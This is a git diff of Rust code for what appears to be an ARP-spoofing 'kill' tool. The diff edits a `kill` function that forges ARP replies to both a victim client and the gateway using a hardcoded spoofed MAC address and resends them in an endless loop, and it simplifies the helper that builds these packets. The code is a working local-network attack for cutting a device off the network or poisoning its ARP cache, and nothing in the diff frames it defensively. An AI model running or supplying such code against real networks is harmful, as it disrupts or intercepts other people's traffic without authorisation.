@@ -51,26 +51,24 @@ pub fn find_gateway(inter: &NetworkInterface) -> TargetDetails {
             .expect("can't get mac address of gateway"),
         vendor: None,
     };
-    //MacAddr::new(mac.0, mac.1, mac.2, mac.3, mac.4, mac.5),
 }
 
 pub fn kill(client: TargetDetails, gateway: TargetDetails, interface: &NetworkInterface) {
     println!("{}", client.ipv4);
     println!("{}", gateway.ipv4);
-    let source_mac = interface.mac.unwrap_or_else(|| {
-        eprintln!("Interface should have a MAC address");
-        process::exit(1);
-    });
+    println!("{}", gateway.mac);
+    println!("{}", client.mac);
+    let source_mac: MacAddr = "ba:3b:bb:20:18:9a".parse().unwrap();
     let packets = vec![
-        create_kill_packet(client.ipv4, gateway.ipv4, source_mac, gateway.mac),
         create_kill_packet(gateway.ipv4, client.ipv4, source_mac, client.mac),
+        create_kill_packet(client.ipv4, gateway.ipv4, source_mac, gateway.mac),
     ];
     let (mut tx, mut rx) = create_data_link(interface);
     loop {
         for p in &packets {
-            tx.send_to(p.to_immutable().packet(), Some(interface.clone()));
+            tx.send_to(p.packet(), Some(interface.clone()));
         }
-        thread::sleep(Duration::from_millis(1500));
+        thread::sleep(Duration::from_millis(5000));
     }
 }
 
@@ -106,8 +104,7 @@ pub fn create_kill_packet(
     arp_packet.set_target_proto_addr(dest_ip);
 
     ethernet_packet.set_payload(arp_packet.packet_mut());
-    let ethernet_packet = ethernet_packet.consume_to_immutable();
-    return ethernet_packet;
+    return ethernet_packet.consume_to_immutable();
 }
 
 pub fn get_interfaces() -> Vec<NetworkInterface> {
